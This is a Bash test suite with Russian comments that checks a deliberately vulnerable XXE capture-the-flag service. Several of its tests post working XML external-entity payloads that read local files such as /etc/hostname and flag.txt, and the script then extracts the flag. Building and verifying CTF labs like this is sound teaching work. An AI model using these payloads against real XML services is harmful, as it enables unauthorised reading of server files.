#!/bin/bash

# Скрипт для тестирования XXE CTF сервиса
# Проверяет работоспособность сервиса и возможность эксплуатации уязвимости

set -e

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Конфигурация
TARGET_URL="${TARGET_URL:-http://localhost:5000}"
API_ENDPOINT="${TARGET_URL}/api/parse"
TIMEOUT=10

# Счетчики
TESTS_PASSED=0
TESTS_FAILED=0

# Функция для вывода заголовков
print_header() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}========================================${NC}"
}

# Функция для вывода результата теста
print_test_result() {
    local test_name=$1
    local result=$2

    if [ "$result" = "PASS" ]; then
        echo -e "${GREEN}✓ PASS${NC} - $test_name"
        ((TESTS_PASSED++))
    else
        echo -e "${RED}✗ FAIL${NC} - $test_name"
        ((TESTS_FAILED++))
    fi
}

# Проверка доступности сервиса
test_service_availability() {
    echo -e "\n${YELLOW}[1] Проверка доступности сервиса...${NC}"

    if curl -s --max-time $TIMEOUT "${TARGET_URL}" > /dev/null; then
        print_test_result "Service is accessible" "PASS"
        return 0
    else
        print_test_result "Service is accessible" "FAIL"
        echo -e "${RED}Ошибка: Сервис недоступен по адресу ${TARGET_URL}${NC}"
        echo -e "${YELLOW}Убедитесь, что сервис запущен: docker-compose up -d${NC}"
        return 1
    fi
}

# Проверка API endpoint
test_api_endpoint() {
    echo -e "\n${YELLOW}[2] Проверка API endpoint...${NC}"

    local payload='<?xml version="1.0" encoding="UTF-8"?><test><value>hello</value></test>'
    local response=$(curl -s --max-time $TIMEOUT -X POST "${API_ENDPOINT}" \
        -H "Content-Type: application/xml" \
        -d "$payload")

    if echo "$response" | grep -q "successfully parsed"; then
        print_test_result "API endpoint responds correctly" "PASS"
        return 0
    else
        print_test_result "API endpoint responds correctly" "FAIL"
        echo "Response: $response"
        return 1
    fi
}

# Проверка обработки XML сущностей
test_internal_entity() {
    echo -e "\n${YELLOW}[3] Проверка обработки внутренних сущностей...${NC}"

    local payload='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY hello "TEST_STRING_123">
]>
<data>
  <value>&hello;</value>
</data>'

    local response=$(curl -s --max-time $TIMEOUT -X POST "${API_ENDPOINT}" \
        -H "Content-Type: application/xml" \
        -d "$payload")

    if echo "$response" | grep -q "TEST_STRING_123"; then
        print_test_result "Internal entities are processed" "PASS"
        echo -e "${GREEN}  → Сервер обрабатывает XML сущности (потенциальная уязвимость)${NC}"
        return 0
    else
        print_test_result "Internal entities are processed" "FAIL"
        echo "Response: $response"
        return 1
    fi
}

# Проверка XXE уязвимости (чтение /etc/hostname)
test_xxe_vulnerability() {
    echo -e "\n${YELLOW}[4] Проверка XXE уязвимости (чтение /etc/hostname)...${NC}"

    local payload='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<data>
  <value>&xxe;</value>
</data>'

    local response=$(curl -s --max-time $TIMEOUT -X POST "${API_ENDPOINT}" \
        -H "Content-Type: application/xml" \
        -d "$payload")

    # Проверяем, что в ответе есть какое-то содержимое (hostname)
    if echo "$response" | grep -q "value" && ! echo "$response" | grep -q "error"; then
        print_test_result "XXE vulnerability exists (file read)" "PASS"
        echo -e "${YELLOW}  → XXE уязвимость подтверждена!${NC}"
        return 0
    else
        print_test_result "XXE vulnerability exists (file read)" "FAIL"
        echo "Response: $response"
        return 1
    fi
}

# Проверка эксплуатации - получение флага
test_flag_extraction() {
    echo -e "\n${YELLOW}[5] Попытка извлечения флага...${NC}"

    # Пробуем разные пути к флагу
    local paths=("/app/flag.txt" "/flag.txt" "flag.txt")

    for path in "${paths[@]}"; do
        echo -e "${BLUE}  Пробуем путь: $path${NC}"

        local payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM \"file://$path\">
]>
<data>
  <value>&xxe;</value>
</data>"

        local response=$(curl -s --max-time $TIMEOUT -X POST "${API_ENDPOINT}" \
            -H "Content-Type: application/xml" \
            -d "$payload")

        if echo "$response" | grep -q "centralctf{"; then
            local flag=$(echo "$response" | grep -oP 'centralctf\{[^}]+\}')
            print_test_result "Flag extraction" "PASS"
            echo -e "${GREEN}${GREEN}  🎉 ФЛАГ НАЙДЕН: $flag${NC}"
            return 0
        fi
    done

    print_test_result "Flag extraction" "FAIL"
    echo -e "${RED}  Не удалось извлечь флаг из известных путей${NC}"
    return 1
}

# Проверка страницы с подсказками
test_hints_page() {
    echo -e "\n${YELLOW}[6] Проверка страницы с подсказками...${NC}"

    local response=$(curl -s --max-time $TIMEOUT "${TARGET_URL}/hint")

    if echo "$response" | grep -q "XXE"; then
        print_test_result "Hints page is accessible" "PASS"
        return 0
    else
        print_test_result "Hints page is accessible" "FAIL"
        return 1
    fi
}

# Проверка примера API
test_example_endpoint() {
    echo -e "\n${YELLOW}[7] Проверка endpoint с примером...${NC}"

    local response=$(curl -s --max-time $TIMEOUT "${TARGET_URL}/api/example")

    if echo "$response" | grep -q "example"; then
        print_test_result "Example endpoint works" "PASS"
        return 0
    else
        print_test_result "Example endpoint works" "FAIL"
        return 1
    fi
}

# Проверка безопасности (негативный тест)
test_error_handling() {
    echo -e "\n${YELLOW}[8] Проверка обработки ошибок...${NC}"

    # Отправляем невалидный XML
    local payload='this is not xml'
    local response=$(curl -s --max-time $TIMEOUT -X POST "${API_ENDPOINT}" \
        -H "Content-Type: application/xml" \
        -d "$payload")

    if echo "$response" | grep -q "error"; then
        print_test_result "Error handling works" "PASS"
        return 0
    else
        print_test_result "Error handling works" "FAIL"
        return 1
    fi
}

# Главная функция
main() {
    print_header "XXE CTF Service Test Suite"

    echo -e "${BLUE}Целевой URL: ${TARGET_URL}${NC}"
    echo -e "${BLUE}API Endpoint: ${API_ENDPOINT}${NC}\n"

    # Проверяем доступность сервиса
    if ! test_service_availability; then
        echo -e "\n${RED}Тесты прерваны: сервис недоступен${NC}"
        exit 1
    fi

    # Запускаем тесты
    test_api_endpoint
    test_internal_entity
    test_xxe_vulnerability
    test_flag_extraction
    test_hints_page
    test_example_endpoint
    test_error_handling

    # Итоговая статистика
    echo -e "\n${BLUE}========================================${NC}"
    echo -e "${BLUE}Результаты тестирования${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo -e "${GREEN}Пройдено: $TESTS_PASSED${NC}"
    echo -e "${RED}Провалено: $TESTS_FAILED${NC}"

    local total=$((TESTS_PASSED + TESTS_FAILED))
    echo -e "Всего тестов: $total"

    if [ $TESTS_FAILED -eq 0 ]; then
        echo -e "\n${GREEN}✓ Все тесты пройдены успешно!${NC}"
        echo -e "${GREEN}Сервис готов к использованию в CTF.${NC}"
        exit 0
    else
        echo -e "\n${YELLOW}⚠ Некоторые тесты провалились${NC}"
        echo -e "${YELLOW}Проверьте логи и конфигурацию сервиса.${NC}"
        exit 1
    fi
}

# Обработка аргументов командной строки
while getopts "u:h" opt; do
    case $opt in
        u)
            TARGET_URL="$OPTARG"
            API_ENDPOINT="${TARGET_URL}/api/parse"
            ;;
        h)
            echo "Usage: $0 [-u URL]"
            echo ""
            echo "Options:"
            echo "  -u URL    Target URL (default: http://localhost:5000)"
            echo "  -h        Show this help message"
            echo ""
            echo "Examples:"
            echo "  $0"
            echo "  $0 -u http://localhost:8080"
            exit 0
            ;;
        \?)
            echo "Invalid option: -$OPTARG" >&2
            exit 1
            ;;
    esac
done

# Запуск тестов
main
